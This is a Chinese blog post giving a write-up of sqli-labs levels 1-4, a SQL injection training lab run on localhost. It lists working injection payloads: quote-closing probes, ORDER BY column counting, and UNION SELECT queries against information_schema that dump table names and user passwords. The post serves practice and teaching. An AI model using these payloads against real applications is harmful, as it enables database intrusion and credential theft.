<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="fzykn06's blog"><meta name="keywords" content="信安, 前端, 后端"><link rel="stylesheet" type="text/css" href="//fonts.loli.net/css?family=Source+Code+Pro"><link rel="stylesheet" type="text/css" href="/css/style.css?v=2.0.4"><link rel="stylesheet" type="text/css" href="/css/highlight.css?v=2.0.4"><link rel="Shortcut Icon" href="/favicon.ico"><link rel="bookmark" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="stylesheet" type="text/css" href="https://unpkg.com/gitalk/dist/gitalk.css?v=2.0.4"><title>sqli-labs-writeup | fzykn06's blog</title><meta name="generator" content="Hexo 4.2.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">sqli-labs-writeup</h1><a id="logo" href="/.">fzykn06's blog</a><p class="description"></p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div><div id="search-form"><div id="result-mask" class="hide"></div><label><input id="search-key" type="text" autocomplete="off" placeholder="搜索"></label><div id="result-wrap" class="hide"><div id="search-result"></div></div><div class="hide"><template id="search-tpl"><div class="item"><a href="/{path}" title="{title}"><div class="title">{title}</div><div class="time">{date}</div><div class="tags">{tags}</div></a></div></template></div></div></div><div id="layout" class="layout-g"><div class="layout-l"><div class="content_container"><div class="post"><h1 class="post-title">sqli-labs-writeup</h1><div class="post-meta"><a href="/2019/12/27/sqli-labs-writeup/#comments" class="comment-count"></a><p><span class="date">Dec 27, 2019</span><span><i id="busuanzi_container_page_pv"><i id="busuanzi_value_page_pv"></i><i>点击</i></i></span></p></div><div class="post-content"><p>一直想着要刷这边的题目，但是一直没抽出时间来（留下了没技术的泪水）。现在补上。。。本文采用每题有新知识点就写一个知识点</p>
<p>关卡题目下载链接：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p>
<p>配置及解题方法参考Lcamry师傅的Mysql注入天书，线上网址：<a href="http://www.cnblogs.com/lcamry/category/846064.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/category/846064.html</a></p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="sql注入分类"><a href="#sql注入分类" class="headerlink" title="sql注入分类"></a>sql注入分类</h2><h3 id="基于从服务器接收到的响应"><a href="#基于从服务器接收到的响应" class="headerlink" title="基于从服务器接收到的响应"></a>基于从服务器接收到的响应</h3><ul>
<li>基于错误的sql错误</li>
<li>联合查询的类型</li>
<li>堆查询注射</li>
<li>SQL盲注<ul>
<li>基于布尔SQL盲注</li>
<li>基于时间的SQL盲注</li>
<li>基于报错的SQL盲注</li>
</ul>
</li>
</ul>
<h3 id="基于如何处理输入的SQL查询（数据类型）"><a href="#基于如何处理输入的SQL查询（数据类型）" class="headerlink" title="基于如何处理输入的SQL查询（数据类型）"></a>基于如何处理输入的SQL查询（数据类型）</h3><ul>
<li>基于字符串</li>
<li>基于数字或者整数为基础的</li>
</ul>
<h3 id="基于程度和顺序的注入"><a href="#基于程度和顺序的注入" class="headerlink" title="基于程度和顺序的注入"></a>基于程度和顺序的注入</h3><ul>
<li>一阶注入</li>
<li>二阶注入</li>
</ul>
<p>一阶注入是指输入的注入语句对Web直接产生了影响，出现了结果；二阶注入类似存储型xss，是指输入提交的语句，无法直接对Web应用程序产生影响，通过其他的辅助间接的对Web产生危害。</p>
<p>基于注入点的位置上的</p>
<ul>
<li>通过用户填入的表单域的注入</li>
<li>通过cookie注入</li>
<li>通过服务器变量注入（头部信息）</li>
</ul>
<h2 id="常用知识点"><a href="#常用知识点" class="headerlink" title="常用知识点"></a>常用知识点</h2><h3 id="常用函数："><a href="#常用函数：" class="headerlink" title="常用函数："></a>常用函数：</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">version</span><span class="params">()</span></span>--数据库版本</span><br><span class="line"><span class="function"><span class="title">user</span><span class="params">()</span></span>--数据库用户名</span><br><span class="line"><span class="function"><span class="title">database</span><span class="params">()</span></span>--数据库名</span><br><span class="line">@@datadir--数据库路径</span><br><span class="line">@@version_compile_os--操作系统版本</span><br></pre></td></tr></table></figure>

<h3 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">contact</span>(<span class="params">str1,str2,...</span>)</span>--没有分隔符的连接字符串</span><br><span class="line"><span class="function"><span class="title">contact_ws</span>(<span class="params">separator,str1,str2,...</span>)</span>--含有分隔符的连接字符串</span><br><span class="line"><span class="function"><span class="title">group_concat</span>(<span class="params">str1,str2,...</span>)</span>--连接这一组的所有字符串，并以逗号隔开每一条数据</span><br><span class="line">#三条都可以一次性查出所有信息</span><br></pre></td></tr></table></figure>

<h3 id="一般的尝试性语句"><a href="#一般的尝试性语句" class="headerlink" title="一般的尝试性语句"></a>一般的尝试性语句</h3><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">or</span> <span class="comment">1=1</span> -- <span class="literal">+</span></span><br><span class="line"><span class="comment">'or</span> <span class="comment">1=1</span> -- <span class="literal">+</span></span><br><span class="line"><span class="comment">"or</span> <span class="comment">1=1</span> -- <span class="literal">+</span></span><br><span class="line"><span class="comment">)or</span> <span class="comment">1=1</span> -- <span class="literal">+</span></span><br><span class="line"><span class="comment">')or</span> <span class="comment">1=1</span> -- <span class="literal">+</span></span><br><span class="line"><span class="comment">")or</span> <span class="comment">1=1</span> -- <span class="literal">+</span></span><br><span class="line"><span class="comment">"))or</span> <span class="comment">1=1</span> -- <span class="literal">+</span></span><br></pre></td></tr></table></figure>

<p>一般代码为：</p>
<p><img src="/2019/12/27/sqli-labs-writeup/6.png" alt></p>
<p>即：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET['id'];</span><br><span class="line">$sql="<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'$id'</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure>

<p>此处考虑两个地方，一个是闭合前面的 <code>&#39;</code>,另一个是为了处理后面的<code>&#39;</code>,有两种思路，闭合后面的引号或者直接<code>-- +</code>或者<code>#(%23)</code>注释掉</p>
<h3 id="union查询"><a href="#union查询" class="headerlink" title="union查询"></a>union查询</h3><p>union查询用于合并两个及以上select语句的结果集（union内部的select语句必须要有相同数量的列，列也必须要有相似的数据类型且每条select语句中的列的顺序也要相同）。</p>
<h4 id="sql-union语法"><a href="#sql-union语法" class="headerlink" title="sql union语法"></a>sql union语法</h4><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name(s) from table_name1 <span class="class"><span class="keyword">union</span> <span class="title">select</span> <span class="title">column_name</span>(<span class="title">s</span>) <span class="title">from</span> <span class="title">table_name2</span></span></span><br></pre></td></tr></table></figure>

<p>默认情况下，union选取的是不同的值，如果要允许重复的值，要使用<code>union all</code></p>
<h4 id="sql-union-all语法"><a href="#sql-union-all语法" class="headerlink" title="sql union all语法"></a>sql union all语法</h4><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name(s) from table_name1 <span class="class"><span class="keyword">union</span> <span class="title">all</span> <span class="title">select</span> <span class="title">column_name</span>(<span class="title">s</span>) <span class="title">from</span> <span class="title">table_name2</span></span></span><br></pre></td></tr></table></figure>

<p>union查询结果中，列名为union中的第一个列名</p>
<h1 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h1><h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><h3 id="基础注入"><a href="#基础注入" class="headerlink" title="基础注入"></a>基础注入</h3><h4 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h4><p>题目链接：<a href="http://localhost/sqli-labs-master/Less-1/" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-1/</a></p>
<p>进入页面，看见下面这句话：</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please input <span class="keyword">the</span> ID <span class="keyword">as</span> parameter <span class="keyword">with</span> <span class="keyword">numeric</span> <span class="built_in">value</span></span><br></pre></td></tr></table></figure>

<p>我们在页面中没有看见输入框，应该可以猜测或者你看源码可知道通过构造playload用GET或者POST方式进行注入，向这题，我们打开源码就可以看到是通过GET方式获取的数据</p>
<p><img src="/2019/12/27/sqli-labs-writeup/7.png" alt></p>
<p>于是构造playload：<code>http://localhost/sqli-labs-master/Less-1/?id=1</code></p>
<p>得到：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your <span class="keyword">Login</span> <span class="type">name</span>:Dumb</span><br><span class="line">Your <span class="keyword">Password</span>:Dumb</span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/1.png" alt></p>
<p>没有报错出现了一个用户名，在 1 后面添加单引号，即  <code>1&#39;</code> 发现报错：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an <span class="builtin-name">error</span> <span class="keyword">in</span> your SQL syntax; check the<span class="built_in"> manual </span>that corresponds <span class="keyword">to</span> your MySQL<span class="built_in"> server </span>version <span class="keyword">for</span> the right syntax <span class="keyword">to</span> use near <span class="string">''</span>1<span class="string">''</span> LIMIT 0,1<span class="string">' at line 1</span></span><br></pre></td></tr></table></figure>

<p>主要的错误点在于<code>&#39;1&#39;&#39; LIMIT 0,1</code> 中添加了一个<code>&#39;</code>,这种方式就是从错误信息中得到我们想要的信息，接下来我们就是要解决这个问题，方法就是在后面添加<code>-- +</code>将后面的内容直接注释掉,于是在后台发送的查询命令就会变为：<code>select **** where id=&#39;1&#39; or 1=1 -- +&#39;LIMIT 0,1</code> 发现没有报错了，尝试order by查询数据库的列数，order by 是对前面的查询数据进行排序。构造<code>http://localhost/sqli-labs-master/Less-1/?id=1&#39; order by 1 -- +</code> 当尝试到4时发现开始报错，这说明在这里只有三列的数据</p>
<p><img src="/2019/12/27/sqli-labs-writeup/2.png" alt></p>
<p>爆出列数，接下来就是用union select进行联合查询，爆出数据库、表、列名：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less<span class="number">-1</span>/?id=<span class="number">1</span><span class="string">' union select 1,2,3 -- +</span></span><br><span class="line"><span class="string">http://localhost/sqli-labs-master/Less-1/?id=-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_contact(<span class="built_in">schema_name</span>) <span class="keyword">from</span> information_schema.schemata<span class="comment">-- +   //获得数据库名security</span></span><br><span class="line">//这边有一个疑问，%<span class="number">23</span>在url编码中是#，如果直接在url输入#不会被编码，以至于会报错，我还没了解到原因然后我改成了<span class="comment">-- + 进行注释后面的内容</span></span><br><span class="line">http://localhost/sqli-labs-master/Less<span class="number">-1</span>/?id=<span class="number">-1</span><span class="string">' union select 1,2,group_contact(table_name) from information_schema.tables where table_schema= '</span><span class="keyword">security</span><span class="string">'-- +  //获得列表名 user</span></span><br><span class="line"><span class="string">http://localhost/sqli-labs-master/Less-1/?id=-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>= <span class="string">'users'</span><span class="comment">-- + //获得列名id,username,password</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/3.png" alt></p>
<p>由此我们已经可以获取到用户信息了</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">3</span> <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/4.png" alt></p>
<p>造成注入的原因分析：</p>
<p>从源码我们得知，sql查询的语句为：<code>select * from users where id = &#39;$id&#39; LIMIT 0,1</code>当服务器获取到被传送的id时直接就放入查询语句进行查询，并没进行id参数过滤，所以当提交<code>or 1=1 -- +</code>就会直接构造sql查询语句<code>select * from users where id=&#39;1&#39; or 1=1 -- + LIMIT 0,1</code>这条查询语句中，<code>or 1=1</code>永远都为真。</p>
<p>当id的数据不存在数据库中时，我们可以使用<code>id=-1</code>,两个sql语句进行联合操作时，当前一个语句为空，就将后面的语句的内容显示出来了，此时前台页面返回的是我们构造的union查询数据。</p>
<h4 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h4><p>进入界面，获得一句话</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please input <span class="keyword">the</span> ID <span class="keyword">as</span> parameter <span class="keyword">with</span> <span class="keyword">numeric</span> <span class="built_in">value</span></span><br></pre></td></tr></table></figure>

<p>跟less1是一样的，那就先按照less1的步骤来，</p>
<p>构造playload</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//localhost/sqli-labs-master/Less-2/?id=1     //没有报错</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//localhost/sqli-labs-master/Less-2/?id=1'    //报错</span></span><br></pre></td></tr></table></figure>

<p>//报错的信息为：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an <span class="builtin-name">error</span> <span class="keyword">in</span> your SQL syntax; check the<span class="built_in"> manual </span>that corresponds <span class="keyword">to</span> your MySQL<span class="built_in"> server </span>version <span class="keyword">for</span> the right syntax <span class="keyword">to</span> use near <span class="string">''</span> LIMIT 0,1<span class="string">' at line 1</span></span><br></pre></td></tr></table></figure>

<p>发现和less1的代码有些不太一样，错误提示为<code>&#39;LIMIT 0,1</code>是因为奇数个单引号出发了异常的抛出。</p>
<p>所以在这使用的查询语句应该是：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span>=(<span class="keyword">some</span> <span class="built_in">integer</span> <span class="keyword">value</span>)</span><br></pre></td></tr></table></figure>

<p>所以跟less1是不同的注入方式，尝试不用单引号闭合，而是使用数字进行查询：</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli-labs-master/Less-<span class="number">2</span>/<span class="built_in">?id</span>=<span class="number">1</span> -- +//正常</span><br><span class="line">http://localhost/sqli-labs-master/Less-<span class="number">2</span>/<span class="built_in">?id</span>=<span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span>-- +   //正常</span><br><span class="line">http://localhost/sqli-labs-master/Less-<span class="number">2</span>/<span class="built_in">?id</span>=<span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>-- +	//正常</span><br><span class="line">http://localhost/sqli-labs-master/Less-<span class="number">2</span>/<span class="built_in">?id</span>=<span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>-- +	//正常</span><br><span class="line">http://localhost/sqli-labs-master/Less-<span class="number">2</span>/<span class="built_in">?id</span>=<span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span>-- +	//报错</span><br><span class="line">http://localhost/sqli-labs-master/Less-<span class="number">2</span>/<span class="built_in">?id</span>=-<span class="number">1</span> <span class="keyword">union</span> select <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> from information_schema.schemata -- + //爆出数据库名<span class="string">'security'</span></span><br><span class="line">http://localhost/sqli-labs-master/Less-<span class="number">2</span>/<span class="built_in">?id</span>=-<span class="number">1</span><span class="meta">%20union</span><span class="meta">%20select</span><span class="meta">%201</span>,group_concat(table_name),<span class="number">3</span><span class="meta">%20from</span><span class="meta">%20information_schema</span>.tables<span class="meta">%20where</span><span class="meta">%20table_schema</span>=<span class="meta">%27security</span><span class="meta">%27</span><span class="meta">%20--</span><span class="meta">%20</span>+   //获得表名<span class="string">'users'</span></span><br><span class="line">http://localhost/sqli-labs-master/Less-<span class="number">2</span>/<span class="built_in">?id</span>=-<span class="number">1</span><span class="meta">%20union</span><span class="meta">%20select</span><span class="meta">%201</span>,group_concat(column_name),<span class="number">3</span><span class="meta">%20from</span><span class="meta">%20information_schema</span>.columns<span class="meta">%20where</span><span class="meta">%20table_name</span>=<span class="meta">%27users</span><span class="meta">%27</span><span class="meta">%20--</span><span class="meta">%20</span>+   //获得列名<span class="built_in"> id</span> username password</span><br><span class="line">http://localhost/sqli-labs-master/Less-<span class="number">2</span>/<span class="built_in">?id</span>=-<span class="number">1</span> <span class="keyword">union</span> select <span class="number">1</span>,username,password from users <span class="keyword">where</span><span class="built_in"> id</span>=<span class="number">3</span>-- +	//获得数据</span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/5.png" alt></p>
<p>我们查看源码，发现在后台我们发送给数据库查询的代码如下</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql="<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=$<span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure>

<p>发现是没有对<code>id</code>进行处理。所以和less1中就是相差一个单引号，只需要将less1中的playload的<code>&#39;</code>删除就行。</p>
<h4 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h4><p>进入界面仍然是那句话</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please input <span class="keyword">the</span> ID <span class="keyword">as</span> parameter <span class="keyword">with</span> <span class="keyword">numeric</span> <span class="built_in">value</span></span><br></pre></td></tr></table></figure>

<p>按照less1的方法继续注入</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//localhost/sqli-labs-master/Less-3/?id=1</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//localhost/sqli-labs-master/Less-3/?id=1' //报错</span></span><br></pre></td></tr></table></figure>

<p>此时返回的报错信息为：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an <span class="builtin-name">error</span> <span class="keyword">in</span> your SQL syntax; check the<span class="built_in"> manual </span>that corresponds <span class="keyword">to</span> your MySQL<span class="built_in"> server </span>version <span class="keyword">for</span> the right syntax <span class="keyword">to</span> use near <span class="string">''</span>1<span class="string">''</span>) LIMIT 0,1<span class="string">' at line 1</span></span><br></pre></td></tr></table></figure>

<p>显然跟上面两个都是一样的，主要的信息为<code>&#39;1&#39;&#39;) LIMIT 0,1</code></p>
<p>所以查询语句中，应该还有括号没有进行闭合，推出查询语句应该是：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">from</span> <span class="keyword">where</span> <span class="keyword">id</span>=(<span class="string">'our input here'</span>)</span><br></pre></td></tr></table></figure>

<p>所以我们要进行括号的闭合采用<code>?id=1&#39;) -- +</code>进行注入</p>
<p><img src="/2019/12/27/sqli-labs-writeup/.png" alt></p>
<p>然后跟less1注入方式相同，只需在<code>&#39;</code>后面增加<code>)</code>就行，下面是各playload</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-3/?id=1') order by 1 <span class="comment">-- +</span></span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-3/?id=1') order by 2 <span class="comment">-- +</span></span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-3/?id=1') order by 3 <span class="comment">-- +</span></span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-3/?id=1') order by 4 <span class="comment">-- +//报错</span></span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-3/?id=-1') union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata <span class="comment">-- +//爆库名</span></span><br><span class="line"><span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs-<span class="keyword">master</span>/<span class="keyword">Less</span><span class="number">-3</span>/?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='</span><span class="keyword">security</span><span class="string">' -- +//爆表名</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs-master/Less-3/?id=-1'</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="comment">-- +//爆列名</span></span><br><span class="line"><span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs-<span class="keyword">master</span>/<span class="keyword">Less</span><span class="number">-3</span>/?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">') union select 1,username,password from users where id=3 -- +//获取数据</span></span><br></pre></td></tr></table></figure>

<h4 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h4><p>less4界面与前面的一致，进行尝试性的注入：</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-<span class="literal">master</span>/Less-<span class="number">4</span>/?<span class="attr">id=</span><span class="number">1</span>   //正常返回</span><br><span class="line">http://localhost/sqli-labs-<span class="literal">master</span>/Less-<span class="number">4</span>/?<span class="attr">id=</span><span class="number">1</span>'   //正常返回</span><br><span class="line">http://localhost/sqli-labs-<span class="literal">master</span>/Less-<span class="number">4</span>/?<span class="attr">id=</span><span class="number">1</span>' <span class="keyword">order</span> <span class="title">by</span> <span class="number">1</span> -- +  //正常</span><br><span class="line">http://localhost/sqli-labs-<span class="literal">master</span>/Less-<span class="number">4</span>/?<span class="attr">id=</span><span class="number">1</span>' <span class="keyword">order</span> <span class="title">by</span> <span class="number">2</span> -- +  //正常</span><br><span class="line">http://localhost/sqli-labs-<span class="literal">master</span>/Less-<span class="number">4</span>/?<span class="attr">id=</span><span class="number">1</span>' <span class="keyword">order</span> <span class="title">by</span> <span class="number">3</span> -- +  //正常</span><br><span class="line">http://localhost/sqli-labs-<span class="literal">master</span>/Less-<span class="number">4</span>/?<span class="attr">id=</span><span class="number">1</span>' <span class="keyword">order</span> <span class="title">by</span> <span class="number">4</span> -- +  //正常</span><br><span class="line">http://localhost/sqli-labs-<span class="literal">master</span>/Less-<span class="number">4</span>/?<span class="attr">id=</span><span class="number">1</span>' <span class="keyword">order</span> <span class="title">by</span> <span class="number">5</span> -- +  //正常</span><br></pre></td></tr></table></figure>

<p>此时我们要注意，我们测试列数到了5还是返回正常，可以尝试一个比较大的数字，发现还是返回正常，说明我们在想法上发生了错误，我们可以在页面的标题中获知double quotes是双引号于是我们将上面的单引号改为双引号进行尝试</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">4</span><span class="regexp">/?id=1"</span></span><br></pre></td></tr></table></figure>

<p>此时我们就获取到错误信息：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an <span class="builtin-name">error</span> <span class="keyword">in</span> your SQL syntax; check the<span class="built_in"> manual </span>that corresponds <span class="keyword">to</span> your MySQL<span class="built_in"> server </span>version <span class="keyword">for</span> the right syntax <span class="keyword">to</span> use near <span class="string">'"1"") LIMIT 0,1'</span> at line 1</span><br></pre></td></tr></table></figure>

<p>由此我们可以获知主要的错误在于<code>&quot;1&quot;&quot;)</code>所以代码中对传输的id进行进行<code>&quot;&quot;</code>和<code>()</code>包装，所以在注入是需要进行双引号和括号的闭合。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-4/?id=1") <span class="comment">-- + //返回正常</span></span><br><span class="line">http://localhost/sqli-labs-master/Less-4/?id=1") order by 1 <span class="comment">-- +  //返回正常</span></span><br><span class="line">http://localhost/sqli-labs-master/Less-4/?id=1") order by 2 <span class="comment">-- +  //返回正常</span></span><br><span class="line">http://localhost/sqli-labs-master/Less-4/?id=1") order by 3 <span class="comment">-- +  //返回正常</span></span><br><span class="line">http://localhost/sqli-labs-master/Less-4/?id=1") order by 4 <span class="comment">-- +  //返回错误  //获得列数为3</span></span><br><span class="line">http://localhost/sqli-labs-master/Less-4/?id=-1") union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata <span class="comment">-- + //获取到数据库名security</span></span><br><span class="line"><span class="keyword">http</span>://localhost/sqli-labs-<span class="keyword">master</span>/<span class="keyword">Less</span><span class="number">-4</span>/?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' -- +  //获取表名 users</span></span><br><span class="line"><span class="string">http://localhost/sqli-labs-master/Less-4/?id=-1"</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="comment">-- + //获取列名id username password</span></span><br><span class="line"><span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs-<span class="keyword">master</span>/<span class="keyword">Less</span><span class="number">-4</span>/?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">") union select 1,username,password from users where id=3 -- +//获取数据</span></span><br></pre></td></tr></table></figure>

<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>盲注就是在sql注入过程中，sql查询语句执行的选择后，选择的数据无法显示在前端的页面，需要利用一些方法进行判断或者尝试。而盲注一般分为三类：</p>
<ul>
<li><p>基于布尔SQL盲注</p>
</li>
<li><p>基于时间的SQL盲注</p>
</li>
<li><p>基于报错的SQL盲注</p>
</li>
</ul>
